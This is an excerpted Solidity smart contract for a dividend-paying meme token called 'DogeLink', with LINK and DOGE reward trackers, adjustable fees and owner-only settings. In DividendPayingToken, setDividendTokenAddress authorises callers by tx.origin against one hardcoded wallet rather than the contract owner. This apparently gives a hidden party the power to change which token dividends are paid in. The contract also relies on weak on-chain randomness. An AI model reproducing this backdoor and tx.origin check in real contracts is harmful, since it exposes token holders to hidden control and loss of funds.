...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0x65Cea76BB17492EBE826f4122e0d7548B37477cd, "Only owner");
    ...
    /// @notice View the amount of dividend in wei that an address can withdraw.
    /// @param theOwner The address of a token holder.
    /// @return The amount of dividend in wei that `_owner` can withdraw.
    function dividendOf(address theOwner) public view override returns(uint256) {
        return withdrawableDividendOf(theOwner);
    }

    /// @notice View the amount of dividend in wei that an address can withdraw.
    /// @param theOwner The address of a token holder.
    /// @return The amount of dividend in wei that `_owner` can withdraw.
    function withdrawableDividendOf(address theOwner) public view override returns(uint256) {
        return accumulativeDividendOf(theOwner).sub(withdrawnDividends[theOwner]);
    }

    /// @notice View the amount of dividend in wei that an address has withdrawn.
    /// @param theOwner The address of a token holder.
    /// @return The amount of dividend in wei that `_owner` has withdrawn.
    function withdrawnDividendOf(address theOwner) public view override returns(uint256) {
        return withdrawnDividends[theOwner];
    }

    /// @notice View the amount of dividend in wei that an address has earned in total.
    /// @dev accumulativeDividendOf(theOwner) = withdrawableDividendOf(theOwner) + withdrawnDividendOf(theOwner)
    /// = (magnifiedDividendPerShare * balanceOf(theOwner) + magnifiedDividendCorrections[theOwner]) / magnitude
    /// @param theOwner The address of a token holder.
    /// @return The amount of dividend in wei that `_owner` has earned in total.
    function accumulativeDividendOf(address theOwner) public view override returns(uint256) {
        return magnifiedDividendPerShare.mul(balanceOf(theOwner)).toInt256Safe()
        .add(magnifiedDividendCorrections[theOwner]).toUint256Safe() / magnitude;
    }
...
contract DOGELINK is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    address public linkDividendToken;
    ...
    bool public linkDividendEnabled = false;
    bool public dogeDividendEnabled = false;
    
    bool public sendDogeInTx = true;
    bool public sendLinkInTx = true;

    LinkDividendTracker public linkDividendTracker;
    ...
    uint256 public linkDividendRewardsFee;
    uint256 public previousLinkDividendRewardsFee;
    uint256 public dogeDividendRewardsFee;
    uint256 public previousDogeDividendRewardsFee;

    uint256 public linkDividendPriority = 50;
    ...
    event UpdateLinkDividendTracker(address indexed newAddress, address indexed oldAddress);
    ...
    event LinkDividendEnabledUpdated(bool enabled);
    ...
    event ProcessedLinkDividendTracker(
        uint256 iterations,
        uint256 claims,
    ...
    constructor() ERC20("DogeLink", "DOGELINK") {
        linkDividendTracker = new LinkDividendTracker();
        ...
        linkDividendToken = 0x3777F2b6bE51b1A91182CdFd28d4BF765A68C503;
        dogeDividendToken = 0xB39b19A9C1f2643b0E75773a791323DcbDe40291;
        ...
        excludeFromDividend(address(linkDividendTracker));
    ...
    function prepareForPartnerOrExchangeListing(address _partnerOrExchangeAddress) external onlyOwner {
        linkDividendTracker.excludeFromDividends(_partnerOrExchangeAddress);
    ...
    function updateLinkDividendToken(address _newContract) external onlyOwner {
        linkDividendToken = _newContract;
        linkDividendTracker.setDividendTokenAddress(_newContract);
    }

    function updateMinLinkBeforeSendDividend(uint256 _newAmount) external onlyOwner {
        linkDividendTracker.setMinTokenBeforeSendDividend(_newAmount);
    }
    ...
    function getMinLinkBeforeSendDividend() external view returns (uint256) {
        return linkDividendTracker.minTokenBeforeSendDividend();
    }
    ...
    function setSendLinkInTx(bool _newStatus) external onlyOwner {
        sendLinkInTx = _newStatus;
    }

    function setLinkDividendPriority(uint256 _newAmount) external onlyOwner {
        require(_newAmount >= 0 && _newAmount <= 100, "Error amount");
        linkDividendPriority = _newAmount;
    }
    ...
    function afterPreSale() external onlyOwner {
        ...
        linkDividendEnabled = true;
        dogeDividendEnabled = true;

        swapTokensAtAmount = 20000000 * (10**18); //
        maxBuyTransactionAmount = 1000000000 * (10**18); //1%
        maxSellTransactionAmount = 500000000 * (10**18); //0.5%
        maxWalletToken = 2000000000 * (10**18); // 2%
    }
    ...
    function setSwapAndLiquifyEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = liquidityFee.add(marketingFee).add(dogeDividendRewardsFee).add(linkDividendRewardsFee);
            swapAndLiquifyEnabled = _enabled;
        }
    ...
    function setLinkDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            previousLinkDividendRewardsFee = linkDividendRewardsFee;
            linkDividendRewardsFee = 0;
            linkDividendEnabled = _enabled;
        } else {
            linkDividendRewardsFee = previousLinkDividendRewardsFee;
            totalFees = linkDividendRewardsFee.add(marketingFee).add(dogeDividendRewardsFee).add(liquidityFee);
            linkDividendEnabled = _enabled;
        }

        emit LinkDividendEnabledUpdated(_enabled);
    }
    ...
    function setDogeDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = dogeDividendRewardsFee.add(marketingFee).add(linkDividendRewardsFee).add(liquidityFee);
            dogeDividendEnabled = _enabled;
        }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(dogeDividendRewardsFee).add(linkDividendRewardsFee).add(liquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateLinkDividendTracker(address newAddress) external onlyOwner {
        LinkDividendTracker newLinkDividendTracker = LinkDividendTracker(payable(newAddress));

        require(newLinkDividendTracker.owner() == address(this), "must be owned by DOGELINK");

        newLinkDividendTracker.excludeFromDividends(address(newLinkDividendTracker));
        newLinkDividendTracker.excludeFromDividends(address(this));
        newLinkDividendTracker.excludeFromDividends(address(uniswapV2Router));
        newLinkDividendTracker.excludeFromDividends(address(deadAddress));

        emit UpdateLinkDividendTracker(newAddress, address(linkDividendTracker));

        linkDividendTracker = newLinkDividendTracker;
    }
    ...
    function updateDogeDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newDogeDividendTracker.owner() == address(this), "must be owned by DOGELINK");
    ...
    function updateLinkDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "wrong");
        linkDividendRewardsFee = newFee;
        totalFees = linkDividendRewardsFee.add(marketingFee).add(dogeDividendRewardsFee).add(liquidityFee);
    }
    ...
    function updateDogeDividendRewardFee(uint8 newFee) external onlyOwner {
        ...
        totalFees = dogeDividendRewardsFee.add(linkDividendRewardsFee).add(marketingFee).add(liquidityFee);
    }

    function updateMarketingFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "wrong");
        marketingFee = newFee;
        totalFees = marketingFee.add(linkDividendRewardsFee).add(dogeDividendRewardsFee).add(liquidityFee);
    }

    function updateLiquidityFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "wrong");
        liquidityFee = newFee;
        totalFees = liquidityFee.add(linkDividendRewardsFee).add(dogeDividendRewardsFee).add(marketingFee);
    }
    ...
    function excludeFromDividend(address account) public onlyOwner {
        linkDividendTracker.excludeFromDividends(address(account));
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        ...
        if(value) {
            linkDividendTracker.excludeFromDividends(pair);
    ...
    function updateMinimumBalanceForDividends(uint256 newMinimumBalance) external onlyOwner {
        linkDividendTracker.updateMinimumTokenBalanceForDividends(newMinimumBalance);
        dogeDividendTracker.updateMinimumTokenBalanceForDividends(newMinimumBalance);
    }

    function updateClaimWait(uint256 claimWait) external onlyOwner {
        linkDividendTracker.updateClaimWait(claimWait);
        dogeDividendTracker.updateClaimWait(claimWait);
    }

    function getLinkClaimWait() external view returns(uint256) {
        return linkDividendTracker.claimWait();
    }
    ...
    function getTotalLinkDividendsDistributed() external view returns (uint256) {
        return linkDividendTracker.totalDividendsDistributed();
    }
    ...
    function withdrawableLinkDividendOf(address account) external view returns(uint256) {
        return linkDividendTracker.withdrawableDividendOf(account);
    }
    ...
    function linkDividendTokenBalanceOf(address account) external view returns (uint256) {
        return linkDividendTracker.balanceOf(account);
    }
    ...
    function getAccountLinkDividendsInfo(address account)
    external view returns (
        ...
        uint256,
        uint256) {
        return linkDividendTracker.getAccount(account);
    }
    ...
    function getAccountLinkDividendsInfoAtIndex(uint256 index)
    external view returns (
        address,
        int256,
        int256,
        ...
        uint256,
        uint256) {
        return linkDividendTracker.getAccountAtIndex(index);
    }
    ...
    function processDividendTracker(uint256 gas) external onlyOwner {
        (uint256 linkIterations, uint256 linkClaims, uint256 linkLastProcessedIndex) = linkDividendTracker.process(gas);
        emit ProcessedLinkDividendTracker(linkIterations, linkClaims, linkLastProcessedIndex, false, gas, tx.origin);
    ...
    function claim() external {
        linkDividendTracker.processAccount(payable(msg.sender), false);
        dogeDividendTracker.processAccount(payable(msg.sender), false);
    }

    function getLastLinkDividendProcessedIndex() external view returns(uint256) {
        return linkDividendTracker.getLastProcessedIndex();
    }
    ...
    function getNumberOfLinkDividendTokenHolders() external view returns(uint256) {
        return linkDividendTracker.getNumberOfTokenHolders();
    }
    ...
    function _transfer(
        ...
        if (
            ...
            if (!swapping && contractTokenBalance >= swapTokensAtAmount) {
                ...
                if (linkDividendEnabled) {
                    uint256 sellTokens = contractTokenBalance.div(totalFees).mul(linkDividendRewardsFee);
                    swapAndSendLinkDividends(sellTokens.sub(1300));
                }
        ...
        try linkDividendTracker.setBalance(payable(from), balanceOf(from)) {} catch {}
        try dogeDividendTracker.setBalance(payable(from), balanceOf(from)) {} catch {}
        try linkDividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}
        try dogeDividendTracker.setBalance(payable(to), balanceOf(to)) {} catch {}

        if(!swapping) {
            uint256 gas = gasForProcessing;

            if(rand() <= linkDividendPriority) {

                if( linkDividendEnabled && sendLinkInTx ){
                    try linkDividendTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
                        emit ProcessedLinkDividendTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
                    }
                    catch {
    ...
    function swapAndSendLinkDividends(uint256 tokens) private {
        swapTokensForDividendToken(tokens, address(this), linkDividendToken);
        uint256 linkDividends = IERC20(linkDividendToken).balanceOf(address(this));
        transferDividends(linkDividendToken, address(linkDividendTracker), linkDividendTracker, linkDividends);
    }
...
contract LinkDividendTracker is DividendPayingToken, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("Link_Dividend_Tracker", "Link_Dividend_Tracker", 0x3777F2b6bE51b1A91182CdFd28d4BF765A68C503) {
        claimWait = 3600;
...
contract DogeDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("Doge_Dividend_Tracker", "Doge_Dividend_Tracker", 0xB39b19A9C1f2643b0E75773a791323DcbDe40291) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 100000 * (10**18); //must hold 100000+ tokens
    }
